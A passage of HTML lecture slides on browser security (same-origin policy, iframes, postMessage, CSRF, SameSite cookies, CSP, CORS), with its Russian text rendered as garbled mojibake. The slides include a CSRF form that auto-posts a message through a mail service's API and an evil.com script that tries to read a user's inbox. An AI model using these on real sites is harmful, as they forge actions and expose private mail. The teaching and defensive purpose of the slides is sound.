		<li><code>window.parent</code> &mdash; –≤–Ω—É—Ç—Ä–∏ <code>iframe</code> —Å—Å—ã–ª–∞–µ—Ç—Å—è –Ω–∞ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –¥–æ–∫—É–º–µ–Ω—Ç</li>
		<li><code>window.top</code> &mdash; –≤–Ω—É—Ç—Ä–∏ <code>iframe</code> —Å—Å—ã–ª–∞–µ—Ç—Å—è —Å–∞–º—ã–π –≤–µ—Ä—Ö–Ω–∏–π —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π —ç–ª–µ–º–µ–Ω—Ç (–≤ —Å–ª—É—á–∞–µ iframe –≤ iframe)</li>
	</ul>
</section>

<section class="slide">
	<h2>–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è <strong>iframe</strong></h2>
	<p class="medium-content"></p>
	<ul>
		<li>–ù–∞ –≤—Å–µ <code>iframe</code> –≤—Å–µ–≥–¥–∞ –Ω–∞–∫–ª–∞–¥—ã–≤–∞—é—Ç—Å—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è, –¥–∏–∫—Ç—É–µ–º—ã–µ <br> Same Origin Policy</li>
		<li>–í —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –µ—Å–ª–∏ –≤ <code>iframe</code> –∑–∞–≥—Ä—É–∂–µ–Ω —Ä–µ—Å—É—Ä—Å —Å –¥—Ä—É–≥–∏–º Origin, —Ç–æ —ç—Ç–∏ –¥–≤–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –Ω–µ –∏–º–µ—é—Ç –¥–æ—Å—Ç—É–ø–∞ –¥—Ä—É–≥ –¥–æ –¥—Ä—É–≥–∞ —á–µ—Ä–µ–∑ <code>iframe.contentWindow</code> –∏ <code>window.parent</code></li>
		<li>–ó–∞–ø–∏—Å—å –≤ <code>window.parent.location</code> —Ä–∞–∑—Ä–µ—à–µ–Ω–∞, –∞ —á—Ç–µ–Ω–∏–µ &mdash; –∑–∞–ø—Ä–µ—â–µ–Ω–æ</li>
		<li>–£ —ç–ª–µ–º–µ–Ω—Ç–∞ <code>iframe</code> –µ—Å—Ç—å –∞—Ç—Ä–∏–±—É—Ç <code>sandbox</code> —Å –≤–æ–∑–º–æ–∂–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏: <code>allow-same-origin</code>, <code>allow-top-navigation</code>, <code>allow-forms</code>, <code>allow-scripts</code></li>
	</ul>
</section>

<section class="slide">
	<h2>–û–±—â–µ–Ω–∏–µ –º–µ–∂–¥—É <strong>iframe</strong> <mark>–Ω–∞–ø—Ä—è–º—É—é</mark></h2>
	<p>–ü—Ä–∏—Å–≤–∞–∏–≤–∞—è –≤ <code>document.domain</code> –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è, –º–æ–∂–Ω–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü–∞–º —Å <em>—Ä–∞–∑–Ω—ã—Ö –ø–æ–¥–¥–æ–º–µ–Ω–æ–≤</em> –æ–±—â–µ–Ω–∏–µ –¥—Ä—É–≥ —Å –¥—Ä—É–≥–æ–º —á–µ—Ä–µ–∑ <mark>iframe</mark> –Ω–∞–ø—Ä—è–º—É—é</p>
	<pre class="hljs js">
		<code>// –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ https://park.mail.ru/</code>
		<code><mark>document.domain</mark>; // 'park.mail.ru'</code>
		<code>document.domain = 'mail.ru'; // success</code>
		<code>document.domain = 'e.mail.ru'; // error</code>
		<code>document.domain = 'google.com'; // error</code>
		<code> </code>
		<code>// –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ https://e.mail.ru/</code>
		<code>document.domain = 'mail.ru'; // success</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–û–±—â–µ–Ω–∏–µ —Å –ø–æ–º–æ—â—å—é <mark>postMessage</mark></h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>otherWindow.postMessage(message, targetOrigin);</code>
		<code>// otherWindow - –ª—é–±–æ–π –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ Window</code>
		<code><span hidden>//</span>    - —Ç–µ–∫—É—â–∏–π <mark>window</mark></code>
		<code><span hidden>//</span>    - –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —á–µ—Ä–µ–∑ –≤—ã–∑–æ–≤ <mark>window.open()</mark></code>
		<code><span hidden>//</span>    - –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —á–µ—Ä–µ–∑ <mark>iframe.contentWindow</mark> –∏–ª–∏ <mark>window.parent</mark></code>
		<code> </code>
		<code>// targetOrigin - <mark>origin</mark> —Ä–µ—Å—É—Ä—Å–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–ª—É—á–∞—Ç —Å–æ–æ–±—â–µ–Ω–∏—è</code>
		<code><span hidden>//</span>                  –º–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å wildcard: '*'</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–°–æ–±—ã—Ç–∏–µ <mark>message</mark></h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>window.addEventListeners('message', function (event) {</code>
		<code>    console.log(event.data); // –ø—Ä–∏—Å–ª–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</code>
		<code>    console.log(event.origin); // <mark>origin</mark>, –∏–∑ –∫–æ—Ç–æ—Ä–æ–≥–æ –ø—Ä–∏—à–ª–æ —Å–æ–æ–±—â–µ–Ω–∏–µ</code>
		<code>    console.log(event.source); // —Å—Å—ã–ª–∫–∞ –Ω–∞ –æ–∫–Ω–æ-–æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å —Å–æ–æ–±—â–µ–Ω–∏—è</code>
		<code>});</code>
		<code> </code>
	</pre>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank">–ü–æ–¥—Ä–æ–±–Ω–µ–µ</a></p>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 75%">Cross-Site Request Forgery (CSRF)</span>
	</h2>
</section>

<section class="slide">
	<h2>–ê—Ç–∞–∫–∞ CSRF</h2>
	<ol>
		<li>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ö–æ–¥–∏—Ç –Ω–∞ —Å–∞–π—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º —Ä–∞–∑–º–µ—â–µ–Ω–∞ –≤–æ—Ç —Ç–∞–∫–∞—è —Ñ–æ—Ä–º–∞:</li>
		<pre class="hljs html">
			<code>&lt;form action="https://e.mail.ru/api/v1/messages/send" method="POST"></code>
			<code>    &lt;input name="message" value="Evil message"></code>
			<code>    &lt;!-- ... --></code>
			<code>&lt;/form></code>
			<code> </code>
		</pre>
		<li>–ü—Ä–∏ –∑–∞—Ö–æ–¥–µ –Ω–∞ —Å–∞–π—Ç, js-—Å–∫—Ä–∏–ø—Ç –≤—ã–∑—ã–≤–∞–µ—Ç <code>submit()</code> —É —Ñ–æ—Ä–º—ã</li>
		<li>–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è POST-–∑–∞–ø—Ä–æ—Å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É <code>https://e.mail.ru/api/v1/messages/send</code></li>
		<li>–¢.–∫. –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –≤ –ü–æ—á—Ç–µ Mail.ru, —Ç–æ –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Å –∫—É–∫–∞–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –ø–∏—Å—å–º–æ</li>
	</ol>
</section>

<section class="slide">
	<h2>–í –∞—Ç–∞–∫–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å–ª–∞–±–∞—è<br>—Å—Ç–æ—Ä–æ–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ cookies</h2>
	<blockquote>
		<p class="medium-content"><b>Cookies</b> –ø–æ–∑–≤–æ–ª—è—é—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –∫—Ç–æ –æ—Ç–ø—Ä–∞–≤–∏–ª –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å, –Ω–æ –æ–Ω–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –≥–æ–≤–æ—Ä—è—Ç –æ –¥–∞–Ω–Ω—ã—Ö —ç—Ç–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞</p>
	</blockquote>
	<p class="note">–ë—Ä–∞—É–∑–µ—Ä—ã –Ω–µ –ø–æ–Ω–∏–º–∞—é—Ç, –∫–∞–∫ —Ä–∞–∑–ª–∏—á–∏—Ç—å, –±—ã–ª–æ –ª–∏ –¥–µ–π—Å—Ç–≤–∏–µ —è–≤–Ω–æ —Å–æ–≤–µ—Ä—à–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º <em>(–∫–∞–∫, —Å–∫–∞–∂–µ–º, –Ω–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏ –Ω–∞ —Ñ–æ—Ä–º–µ –∏–ª–∏ –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ)</em> –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ—É–º—ã—à–ª–µ–Ω–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ <em>(–∑–∞–π–¥—è –Ω–∞ "–ø–ª–æ—Ö–æ–π" —Å–∞–π—Ç)</em></p>
</section>

<section class="slide">
	<h2>–ó–∞—â–∏—Ç–∞ –æ—Ç CSRF-–∞—Ç–∞–∫ —Å –ø–æ–º–æ—â—å—é<br>CSRF-—Ç–æ–∫–µ–Ω–æ–≤</h2>
	<ol>
		<li>–ü—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—Ä–æ—Å–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –≤ —Ç–µ–ª–µ –æ—Ç–≤–µ—Ç–∞ –∏–ª–∏ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ <code>X-CSRF-Token</code> —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–¥–∞—ë—Ç –Ω–∞ –∫–ª–∏–µ–Ω—Ç <mark>token</mark> &mdash; —Å–ª—É—á–∞–π–Ω—É—é —Å—Ç—Ä–æ–∫—É, –∏ –∫–ª–∏–µ–Ω—Ç —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ—ë —É —Å–µ–±—è –≤ –∫–∞–∫–æ–π-—Ç–æ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π, –Ω–æ –Ω–µ –≤ cookies</li>
		<li>–ü—Ä–∏ –ø–æ—Å–ª–µ–¥—É—é—â–∏—Ö –∑–∞–ø—Ä–æ—Å–∞—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∫–ª–∏–µ–Ω—Ç –¥–æ–±–∞–≤–ª—è–µ—Ç —ç—Ç–æ—Ç —Ç–æ–∫–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–æ–≤ –∏–ª–∏ –≤ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –ø–æ–ª–µ –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞</li>
		<li>–°–µ—Ä–≤–µ—Ä –Ω–∞ –∫–∞–∂–¥—ã–π –∑–∞–ø—Ä–æ—Å –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç <mark>token</mark> –∏ –µ—Å–ª–∏ –æ–Ω –Ω–µ –±—ã–ª –ø–µ—Ä–µ–¥–∞–Ω, –ª–∏–±–æ –æ–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π, —Ç–æ —Å–µ—Ä–≤–µ—Ä –æ—Ç–∫–ª–æ–Ω—è–µ—Ç —ç—Ç–æ—Ç –∑–∞–ø—Ä–æ—Å</li>
		<li>–¢.–∫. –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É —Ç–æ–∫–µ–Ω –Ω–µ –∏–∑–≤–µ—Å—Ç–µ–Ω, —Ç–æ –æ–Ω –Ω–µ —Å–º–æ–∂–µ—Ç –ø–æ–¥–¥–µ–ª–∞—Ç—å –Ω–∞—à –∑–∞–ø—Ä–æ—Å</li>
	</ol>
</section>

<section class="slide">
	<h2>
		<span>–ê –µ—Å–ª–∏ –ª–∏ –¥–∂–µ–¥–∞–π—Å–∫–∏–π —Å–ø–æ—Å–æ–±?</span>
	</h2>
	<p><img class="place" src="https://media.giphy.com/media/mNgfzPd1gQ8EM/giphy.gif" /></p>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 85%">samesite</span>
	</h2>
</section>

<section class="slide">
	<h2>Samesite</h2>
	<p class="ciu_embed medium-content" style="text-indent: 0;" data-feature="same-site-cookie-attribute" data-periods="future_1,current,past_1,past_2" data-accessible-colours="false">
		<picture>
		<source type="image/webp" srcset="https://caniuse.bitsofco.de/image/same-site-cookie-attribute.webp">
		<source type="image/png" srcset="https://caniuse.bitsofco.de/image/same-site-cookie-attribute.png">
		<img src="https://caniuse.bitsofco.de/image/same-site-cookie-attribute.jpg" alt="Data on support for the same-site-cookie-attribute feature across the major browsers from caniuse.com">
		</picture>
	</p>
</section>

<section class="slide">
	<h2>Samesite cookie üç™</h2>
	<blockquote>
		<p class="medium-content"><b>Samesite</b> &mdash; —Å—Ä–∞–≤–Ω–∏—Ç–µ–ª—å–Ω–æ –Ω–æ–≤—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∫—É–∫, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—â–∏–π –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∏—Ö –ø–µ—Ä–µ–¥–∞—á–µ–π —Å–æ–≥–ª–∞—Å–Ω–æ Origin policy. –í–∞–∂–Ω–æ –∑–∞–º–µ—Ç–∏—Ç—å, —á—Ç–æ –¥–∞–Ω–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å <strong>secure</strong> cookies.</p>
	</blockquote>
	<p class="note">
		–í–æ–∑–º–æ–∂–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è: Strict, Lax <small>(by default)</small>, None.<br/>
		Set-Cookie: foo=bar; SameSite=Lax
	</p>
</section>

<section class="slide">
	<h2>Samesite. Strict üí™</h2>
	<p class="medium-content">
		Cookies —Å `samesite=strict` <strong>–Ω–∏–∫–æ–≥–¥–∞</strong> –Ω–µ –æ—Ç–ø—Ä–∞–≤—è—Ç—Å—è, –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–∏—à—ë–ª –Ω–µ —Å —ç—Ç–æ–≥–æ –∂–µ —Å–∞–π—Ç–∞.<br/>
		–í–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ cookies –Ω–µ –±—É–¥—É—Ç –ø–µ—Ä–µ—Å—ã–ª–∞—Ç—å—Å—è —Ç–∞–∫–∂–µ –ø—Ä–∏ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –≤—ã—Å–æ–∫–æ–≥–æ —É—Ä–æ–≤–Ω—è (—Ç.–µ. –¥–∞–∂–µ –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –ø–æ —Å—Å—ã–ª–∫–µ)</br>
		–ü—Ä–∏–º–µ—Ä: vk.com -> site.com -> cookies –Ω–µ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è
	</p>
</section>

<section class="slide">
	<h2>Samesite. Lax üç£</h2>
	<p class="medium-content">
		Cookies —Å `samesite=lax` <strong>–æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è</strong>, –µ—Å–ª–∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –¥–≤–∞ —É—Å–ª–æ–≤–∏—è:
		<ol>
			<li>–ò—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ HTTP-–º–µ—Ç–æ–¥—ã (GET, HEAD, OPTIONS –∏ TRACE) <sub><a href="https://tools.ietf.org/html/rfc7231#section-4.2.1">rfc</a></sub>. –ì–ª–∞–≤–Ω—ã–π –ø—Ä–∏–Ω—Ü–∏–ø ‚Äì –º–µ—Ç–æ–¥—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, –Ω–µ –¥–ª—è –∏—Ö –∏–∑–º–µ–Ω–µ–Ω–∏—è. –ü–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–µ–Ω GET-–º–µ—Ç–æ–¥—É, —Ç.–µ. —è–≤–ª—è–µ—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω—ã–º</li>
			<li>–û–ø–µ—Ä–∞—Ü–∏—è –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç –Ω–∞–≤–∏–≥–∞—Ü–∏—é –≤–µ—Ä—Ö–Ω–µ–≥–æ —É—Ä–æ–≤–Ω—è. –°–µ—Ç–µ–≤—ã–µ –∑–∞–ø—Ä–æ—Å—ã –∏–∑ JS –Ω–µ —è–≤–ª—è—é—Ç—Å—è –Ω–∞–≤–∏–≥–∞—Ü–∏–µ–π –∏ –Ω–µ –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å cookies.</li>
		</ol>
	</p>
</section>

<section class="slide question">
	<h2><a href="https://www.youtube.com/watch?v=NgKaJGoRbA0&list=PLbinbKmdgqPQDvXBX9NVNslFtO4PbZIz1&index=30" style="font-size: 70%;" target="_blank">–¥–æ–∫–ª–∞–¥ üî•</a></h2>
</section>

<section class="slide question">
	<h2><span style="font-size: 80%; display: inline-block;">Content Security Policy</span></h2>
</section>

<section class="slide">
	<h2>Content Security Policy</h2>
	<blockquote>
		<p class="medium-content"><b>Content-Security-Policy (CSP) <sub>aka –¶–µ SP</sub></b> &mdash; HTTP-–∑–∞–≥–æ–ª–æ–≤–æ–∫<sup>*</sup>, —Ä–µ–≥—É–ª–∏—Ä—É—é—â–∏–π —Å–ø–∏—Å–æ–∫ –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –∏ —Ç–∏–ø –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –Ω–∏–º–∏</p>
		<p class="note"><a href="https://developer.mozilla.org/ru/docs/Web/HTTP/CSP" target="_blank">–ü–æ–¥—Ä–æ–±–Ω–µ–µ –Ω–∞ MDN</a></p>
	</blockquote>
	<p class="small-content">–ü—Ä–∏–º–µ—Ä:
		<pre>Content-Security-Policy: script-src 'self' https://mail.ru</pre>
		<pre><sup><strong>*:</strong></sup> &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src 'self' https://mail.ru&quot; /&gt;</pre>
	</p>
</section>

<section class="slide">
	<h2>Content Security Policy</h2>
	<p class="medium-content">
		<ul>
			<li><strong>connect-src</strong> &mdash; –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç origin-—ã, –∫ –∫–æ—Ç–æ—Ä—ã–º –º–æ–∂–Ω–æ —Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è —Å –ø–æ–º–æ—â—å—é XHR, WebSocket-–æ–≤ –∏ —Ç–¥.</li>
			<li><strong>img-src</strong> &mdash; –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç origin-—ã,  c –∫–æ—Ç–æ—Ä—ã—Ö –º–æ–∂–Ω–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–∞—Ä—Ç–∏–Ω–∫–∏</li>
			<li><strong>style-src</strong></li>
			<li><strong>script-src</strong></li>
			<li><strong>font-src</strong></li>
			<li><strong>media-src</strong> &mdash; &lt;audio&gt;, &lt;video&gt; –∏ &lt;track&gt;</li>
			<li><strong>child-src</strong> (frame-src) &mdash; iframes</li>
			<li><strong>form-action</strong></li>
			<li><strong>base-uri</strong> &mdash; &lt;base&gt;</li>
			<li><strong>default-src</strong> </li>
		</ul>
	</p>
</section>

<section class="slide">
	<h2>Content Security Policy</h2>
	<p class="medium-content">
		–ù–µ—Ç fallback –Ω–∞ default-src –¥–ª—è:
		<ul>
			<li>base-uri</li>
			<li>form-action</li>
			<li>frame-ancestors</li>
			<li>plugin-types</li>
			<li>report-uri</li>
			<li>sandbox</li>
		</ul>
	</p>
</section>

<section class="slide">
	<h2>Content Security Policy. –°—Ç–∞–Ω–¥–∞—Ä—Ç—ã</h2>
	<ul>
		<li>CSP1 - 2015 –≥–æ–¥ <strong>(—É—Å—Ç–∞—Ä–µ–ª–æ)</strong></li>
		<li>CSP2 - 2016 –≥–æ–¥ ‚¨ÖÔ∏è —Å–ª–æ–º–∞–Ω–∞ –æ–±—Ä–∞—Ç–Ω–∞—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å. –î–µ–π—Å—Ç–≤—É—é—â–∏–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç</li>
		<li>CSP3 - —Å 2018 –≥–æ–¥–∞ –≤ —Å—Ç–∞—Ç—É—Å–µ Working Draft</li>
	</ul>
	<p class="ciu_embed" style="text-indent: 0;" data-feature="contentsecuritypolicy2" data-periods="future_1,current,past_1,past_2" data-accessible-colours="false">
	</p>
</section>

<section class="slide">
	<h2>Content Security Policy</h2>
	<ul>
		<li>`none`</li>
		<li>`self`</li>
		<li>`unsafe-inline`</li>
		<li>`unsafe-eval`</li>
	</ul>
</section>

<section class="slide">
	<h2>Content Security Policy. Strict CSP</h2>
	<p class="medium-content">
		–ö–∞–∫–∏–º–∏ —Å–≤–æ–π—Å—Ç–≤–∞–º–∏ –¥–æ–ª–∂–Ω–∞ –æ–±–ª–∞–¥–∞—Ç—å —Ö–æ—Ä–æ—à–∞—è –ø–æ–ª–∏—Ç–∏–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏?
		<ul>
			<li>default-src: 'none'</li>
			<li>–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ unsafe-eval, unsafe-inline –≤ –¥–∏—Ä–µ–∫—Ç–∏–≤–∞—Ö script-src & style-src</li>
			<li>no 3rd party sources <sup>*</sup></li>
		</ul>
	</p>
</section>

<section class="slide">
	<h2>Content Security Policy. IRLüåê</h2>
	<p class="medium-content">–ö–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å –∏ –Ω–µ —Å–ª–æ–º–∞—Ç—å production?<br>
		–ï—Å—Ç—å 2 —Ä–µ–∂–∏–º–∞ —Ä–∞–±–æ—Ç—ã:
		<ul>
			<li>Content-Security-Policy - –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–∞—è —Ä–∞–±–æ—Ç–∞ —Å–æ–≥–ª–∞—Å–Ω–æ –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–º –ø–æ–ª–∏—Ç–∏–∫–∞–º</li>
			<li>Content-Security-Policy-Report-Only - `silent`-—Ä–µ–∂–∏–º, –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –æ—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–æ–≤ –ø–æ –∞–¥—Ä–µ—Å—É, —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –≤ report-uri</li>
		</ul>
	</p>

</section>

<section class="slide question">
	<h2><span style="font-size: 80%; display: inline-block;">–ö–∞–∫ –∑–∞–∫–æ–Ω–Ω–æ –æ–±–æ–π—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è Same Origin Policy?</span></h2>
</section>

<section class="slide question">
	<h2><span style="font-size: 80%">–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –Ω–∞—à–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π</span></h2>
</section>

<section class="slide">
	<h2>–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –Ω–∞—à–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π?</h2>
	<div style="position:relative;width: 100%; height: 75%;">
		<img class="place" src="arch.png" style="transform-origin: center;transform: translate(-50.45%,-51%) scale(.893);">
	</div>
</section>

<section class="slide">
	<h2>HTTP access control (CORS)</h2>
	<p class="medium-content"></p>
	<blockquote>
		<p class="small-content"><b>Cross-Origin Resource Sharing (CORS) standard</b> &mdash; —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è,
			–ø–æ–∑–≤–æ–ª—è—é—â–∞—è –æ–±–æ–π—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ Same Origin Policy –Ω–∞–∫–ª–∞–¥—ã–≤–∞–µ—Ç –Ω–∞ –∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã</p>
	</blockquote>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">–ü–æ–¥—Ä–æ–±–Ω–µ–µ</a></p>
</section>

<section class="slide">
	<h2>Cross Origin HTTP-–∑–∞–ø—Ä–æ—Å—ã (
		<mark>XHR</mark>
		)
	</h2>
	<pre class="hljs js">
		<code>// –ù–∞—Ö–æ–¥–∏–º—Å—è –Ω–∞ https://evil.com/</code>
		<code>const xhr = new XMLHttpRequest();</code>
		<code>xhr.open('GET', <mark>'https://e.mail.ru/messages/inbox/'</mark>, false);</code>
		<code>xhr.send();</code>
		<code> </code>
		<code>console.log(xhr.responseText)</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ó–∞–ø—Ä–æ—Å—ã –¥–µ–ª—è—Ç—Å—è –Ω–∞ –¥–≤–∞ —Ç–∏–ø–∞</h2>
	<p>–ü—Ä–æ—Å—Ç—ã–º–∏ —Å—á–∏—Ç–∞—é—Ç—Å—è –∑–∞–ø—Ä–æ—Å—ã, –µ—Å–ª–∏ –æ–Ω–∏ —É–¥–æ–≤–ª–µ—Ç–≤–æ—Ä—è—é—Ç —Å–ª–µ–¥—É—é—â–∏–º –¥–≤—É–º —É—Å–ª–æ–≤–∏—è–º:</p>
	<ul>
		<li>–ü—Ä–æ—Å—Ç–æ–π –º–µ—Ç–æ–¥: GET, POST –∏–ª–∏ HEAD</li>
		<li>–ü—Ä–æ—Å—Ç—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ &mdash; —Ç–æ–ª—å–∫–æ –∏–∑ —Å–ø–∏—Å–∫–∞:
			<ul>
				<li><code>Accept</code></li>
				<li><code>Accept-Language</code></li>
				<li><code>Content-Language</code></li>
				<li><code>Content-Type</code>
					<ul>
						<li><code>application/x-www-form-urlencoded</code></li>
						<li><code>multipart/form-data</code></li>
						<li><code>text/plain</code></li>
					</ul>
				</li>
			</ul>
		</li>
	</ul>
</section>

<section class="slide">
	<h2>CORS –¥–ª—è –ø—Ä–æ—Å—Ç—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤</h2>
	<pre class="hljs http">
			<code>GET /data HTTP/1.1</code>
			<code>Host: e.mail.ru</code>
			<code>Origin: http://frontend.tech-mail.ru /// <- –≤—ã—Å—Ç–∞–≤–ª—è–µ—Ç –±—Ä–∞—É–∑–µ—Ä</code>
			<code> </code>
		</pre>
	<pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code><mark>Access-Control-Allow-Origin:</mark> http://frontend.tech-mail.ru</code>
			<code>// Access-Control-Allow-Origin: *</code>
			<code>// –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –±—Ä–∞—É–∑–µ—Ä</code>
		</pre>
</section>

<section class="slide">
	<h2>CORS –¥–ª—è –ø—Ä–æ—Å—Ç—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤:<br/>–¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏</h2>
	<pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code>Access-Control-Allow-Origin: http://frontend.tech-mail.ru</code>
			<code>...</code>
			<code>X-UID: 42</code>
			<code>X-Secret: 2c9de507f2c54aa1</code>
